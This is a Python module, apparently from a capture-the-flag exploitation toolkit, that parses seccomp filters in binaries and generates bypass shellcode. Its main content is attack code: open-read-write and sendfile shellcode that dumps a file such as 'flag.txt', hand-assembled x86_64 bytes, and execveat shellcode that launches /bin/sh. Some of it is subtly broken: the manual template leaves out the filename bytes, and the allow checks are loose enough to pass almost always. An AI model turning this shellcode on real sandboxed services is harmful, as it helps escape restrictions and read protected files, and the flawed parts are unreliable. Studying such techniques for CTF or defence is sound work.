"""
Seccomp analysis and bypass techniques.

Handles:
- Seccomp rule extraction and analysis
- Bypass shellcode generation (ORW, sendfile, etc.)
- Allowed syscall detection
"""

import subprocess
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class SeccompAction(Enum):
    """Seccomp filter actions."""
    KILL = auto()
    TRAP = auto()
    ERRNO = auto()
    TRACE = auto()
    LOG = auto()
    ALLOW = auto()


@dataclass
class SeccompRule:
    """Represents a single seccomp rule."""
    syscall_nr: int
    syscall_name: str
    action: SeccompAction
    conditions: List[str] = field(default_factory=list)


@dataclass
class SeccompFilter:
    """Complete seccomp filter analysis."""
    rules: List[SeccompRule] = field(default_factory=list)
    default_action: SeccompAction = SeccompAction.KILL
    arch: str = "x86_64"

    # Extracted info
    allowed_syscalls: Set[str] = field(default_factory=set)
    blocked_syscalls: Set[str] = field(default_factory=set)

    def allows(self, syscall: str) -> bool:
        """Check if syscall is allowed."""
        return syscall in self.allowed_syscalls

    def blocks(self, syscall: str) -> bool:
        """Check if syscall is blocked."""
        return syscall in self.blocked_syscalls or syscall not in self.allowed_syscalls


# Common syscall numbers (x86_64)
SYSCALLS_X64 = {
    0: "read",
    1: "write",
    2: "open",
    3: "close",
    9: "mmap",
    10: "mprotect",
    11: "munmap",
    21: "access",
    33: "dup2",
    40: "sendfile",
    41: "socket",
    42: "connect",
    56: "clone",
    57: "fork",
    59: "execve",
    60: "exit",
    62: "kill",
    102: "getuid",
    105: "setuid",
    157: "prctl",
    217: "getdents64",
    257: "openat",
    262: "newfstatat",
    322: "execveat",
}

# Reverse mapping
SYSCALL_NRS_X64 = {v: k for k, v in SYSCALLS_X64.items()}


class SeccompAnalyzer:
    """
    Analyze seccomp filters in binaries.

    Uses seccomp-tools if available, otherwise tries to extract
    from binary statically.
    """

    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.filter: Optional[SeccompFilter] = None

    def analyze(self) -> SeccompFilter:
        """
        Analyze seccomp filter in binary.

        Returns:
            SeccompFilter with extracted rules
        """
        # Try seccomp-tools first
        filter_result = self._run_seccomp_tools()

        if filter_result:
            self.filter = filter_result
            return self.filter

        # Fall back to static analysis
        self.filter = self._static_analysis()
        return self.filter

    def _run_seccomp_tools(self) -> Optional[SeccompFilter]:
        """Run seccomp-tools dump on binary."""
        try:
            result = subprocess.run(
                ["seccomp-tools", "dump", self.binary_path],
                capture_output=True,
                text=True,
                timeout=30,
                input="\n",  # Provide input to progress past prompts
            )

            if result.returncode == 0 and result.stdout:
                return self._parse_seccomp_tools_output(result.stdout)

        except FileNotFoundError:
            logger.debug("seccomp-tools not found")
        except subprocess.TimeoutExpired:
            logger.debug("seccomp-tools timed out")
        except Exception as e:
            logger.debug(f"seccomp-tools failed: {e}")

        return None

    def _parse_seccomp_tools_output(self, output: str) -> SeccompFilter:
        """Parse seccomp-tools output."""
        filter_obj = SeccompFilter()

        # Parse lines like:
        # 0000: A = arch
        # 0001: if (A != ARCH_X86_64) goto 0016
        # 0002: A = sys_number
        # 0003: if (A == read) goto 0014

        lines = output.strip().split('\n')

        for line in lines:
            # Match syscall check lines
            match = re.search(r'if \(A == (\w+)\) goto \d+ \((\w+)\)', line)
            if match:
                syscall_name = match.group(1)
                action_str = match.group(2).upper()

                try:
                    action = SeccompAction[action_str]
                except KeyError:
                    action = SeccompAction.ALLOW if "ALLOW" in action_str else SeccompAction.KILL

                if action == SeccompAction.ALLOW:
                    filter_obj.allowed_syscalls.add(syscall_name)
                else:
                    filter_obj.blocked_syscalls.add(syscall_name)

            # Match default action
            if "return KILL" in line:
                filter_obj.default_action = SeccompAction.KILL
            elif "return ALLOW" in line:
                filter_obj.default_action = SeccompAction.ALLOW

        return filter_obj

    def _static_analysis(self) -> SeccompFilter:
        """Attempt static analysis for seccomp rules."""
        filter_obj = SeccompFilter()

        # Look for prctl or seccomp syscall usage
        try:
            result = subprocess.run(
                ["objdump", "-d", self.binary_path],
                capture_output=True,
                text=True,
                timeout=60,
            )

            # Look for seccomp-related constants
            if "SECCOMP" in result.stdout or "prctl" in result.stdout:
                logger.info("Binary appears to use seccomp")

                # Common patterns suggest ORW allowed
                if "openat" in result.stdout.lower():
                    filter_obj.allowed_syscalls.add("openat")
                if "sendfile" in result.stdout.lower():
                    filter_obj.allowed_syscalls.add("sendfile")

        except Exception as e:
            logger.debug(f"Static analysis failed: {e}")

        return filter_obj


class SeccompBypass:
    """
    Generate shellcode for seccomp bypass.

    Techniques:
    - ORW (open-read-write) for flag reading
    - sendfile for efficient file transfer
    - getdents for directory listing
    - Syscall alternatives (openat vs open)
    """

    def __init__(self, filter_obj: Optional[SeccompFilter] = None, arch: str = "amd64"):
        self.filter = filter_obj or SeccompFilter()
        self.arch = arch

    def can_orw(self) -> bool:
        """Check if Open-Read-Write is possible."""
        # Check for open/openat
        has_open = (
            self.filter.allows("open") or
            self.filter.allows("openat") or
            not self.filter.blocks("open") or
            not self.filter.blocks("openat")
        )

        has_read = self.filter.allows("read") or not self.filter.blocks("read")
        has_write = self.filter.allows("write") or not self.filter.blocks("write")

        return has_open and has_read and has_write

    def can_sendfile(self) -> bool:
        """Check if sendfile bypass is possible."""
        has_open = (
            self.filter.allows("open") or
            self.filter.allows("openat")
        )
        has_sendfile = self.filter.allows("sendfile") or not self.filter.blocks("sendfile")

        return has_open and has_sendfile

    def generate_orw_shellcode(
        self,
        filename: bytes = b"flag.txt",
        use_openat: bool = True,
    ) -> bytes:
        """
        Generate Open-Read-Write shellcode.

        Args:
            filename: File to read
            use_openat: Use openat instead of open

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, shellcraft, context
            context.arch = self.arch

            if use_openat:
                # openat(AT_FDCWD, "flag.txt", 0)
                # read(fd, buf, 0x100)
                # write(1, buf, 0x100)
                sc = shellcraft.openat(-100, filename, 0)  # AT_FDCWD = -100
                sc += shellcraft.read('rax', 'rsp', 0x100)
                sc += shellcraft.write(1, 'rsp', 0x100)
            else:
                # open("flag.txt", 0)
                # read(fd, buf, 0x100)
                # write(1, buf, 0x100)
                sc = shellcraft.open(filename, 0)
                sc += shellcraft.read('rax', 'rsp', 0x100)
                sc += shellcraft.write(1, 'rsp', 0x100)

            return asm(sc)

        except ImportError:
            logger.warning("pwntools not available, returning template")
            return self._orw_template(filename, use_openat)

    def _orw_template(self, filename: bytes, use_openat: bool) -> bytes:
        """Manual ORW shellcode template."""
        # x86_64 shellcode
        if use_openat:
            # openat(-100, filename, 0)
            return bytes([
                # Push filename
                0x48, 0x31, 0xd2,              # xor rdx, rdx
                0x52,                          # push rdx
                # ... filename bytes would go here
                0x48, 0x89, 0xe6,              # mov rsi, rsp
                0x48, 0xc7, 0xc7, 0x9c, 0xff, 0xff, 0xff,  # mov rdi, -100 (AT_FDCWD)
                0x48, 0xc7, 0xc0, 0x01, 0x01, 0x00, 0x00,  # mov rax, 257 (openat)
                0x0f, 0x05,                    # syscall
                # read(rax, rsp, 0x100)
                0x48, 0x89, 0xc7,              # mov rdi, rax
                0x48, 0x89, 0xe6,              # mov rsi, rsp
                0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # mov rdx, 0x100
                0x48, 0x31, 0xc0,              # xor rax, rax (read = 0)
                0x0f, 0x05,                    # syscall
                # write(1, rsp, rax)
                0x48, 0x89, 0xc2,              # mov rdx, rax
                0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,  # mov rdi, 1
                0x48, 0x89, 0xe6,              # mov rsi, rsp
                0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  # mov rax, 1 (write)
                0x0f, 0x05,                    # syscall
            ])
        return b""

    def generate_sendfile_shellcode(
        self,
        filename: bytes = b"flag.txt",
    ) -> bytes:
        """
        Generate sendfile-based shellcode.

        sendfile(out_fd, in_fd, offset, count)
        More efficient than read+write.

        Args:
            filename: File to read

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, context
            context.arch = self.arch

            # openat(-100, "flag.txt", 0)
            # sendfile(1, fd, 0, 0x100)
            sc = f'''
                /* openat(AT_FDCWD, filename, 0) */
                xor rdx, rdx
                push rdx
                mov rax, {int.from_bytes(filename[:8].ljust(8, b'\x00'), 'little')}
                push rax
                mov rsi, rsp
                mov rdi, -100
                mov rax, 257
                syscall

                /* sendfile(1, fd, 0, 0x100) */
                xor rdi, rdi
                inc rdi
                mov rsi, rax
                xor rdx, rdx
                mov r10, 0x100
                mov rax, 40
                syscall
            '''

            return asm(sc)

        except ImportError:
            return b""

    def generate_execve_alternative(self) -> Optional[bytes]:
        """
        Try to find execve alternatives.

        If execve is blocked, try:
        - execveat
        - Writing to /proc/self/mem
        - Overwriting .text with shell
        """
        if self.filter.allows("execveat"):
            try:
                from pwn import asm, shellcraft, context
                context.arch = self.arch

                # execveat(AT_FDCWD, "/bin/sh", NULL, NULL, 0)
                sc = '''
                    xor rsi, rsi
                    push rsi
                    mov rdi, 0x68732f6e69622f
                    push rdi
                    mov rdi, rsp
                    xor rdx, rdx
                    xor r10, r10
                    xor r8, r8
                    mov rax, 322
                    syscall
                '''
                return asm(sc)
            except ImportError:
                pass

        return None

    def suggest_bypass(self) -> Dict[str, Any]:
        """
        Suggest best bypass technique for current filter.

        Returns:
            Bypass suggestion with shellcode
        """
        result = {
            "techniques": [],
            "recommended": None,
            "shellcode": None,
        }

        if self.can_orw():
            result["techniques"].append("ORW (open-read-write)")
            result["recommended"] = "ORW"
            result["shellcode"] = self.generate_orw_shellcode()

        if self.can_sendfile():
            result["techniques"].append("sendfile")
            if not result["recommended"]:
                result["recommended"] = "sendfile"
                result["shellcode"] = self.generate_sendfile_shellcode()

        if self.filter.allows("execveat"):
            result["techniques"].append("execveat")

        if self.filter.allows("mprotect"):
            result["techniques"].append("mprotect + shellcode")

        if not result["techniques"]:
            result["error"] = "No obvious bypass found"
            result["allowed"] = list(self.filter.allowed_syscalls)

        return result

    def summary(self) -> str:
        """Get bypass summary."""
        return f"""
Seccomp Bypass Analysis
=======================
Can ORW: {self.can_orw()}
Can sendfile: {self.can_sendfile()}

Allowed syscalls: {', '.join(self.filter.allowed_syscalls) or 'Unknown'}
Blocked syscalls: {', '.join(self.filter.blocked_syscalls) or 'Unknown'}

Recommended: {self.suggest_bypass().get('recommended', 'Unknown')}
"""
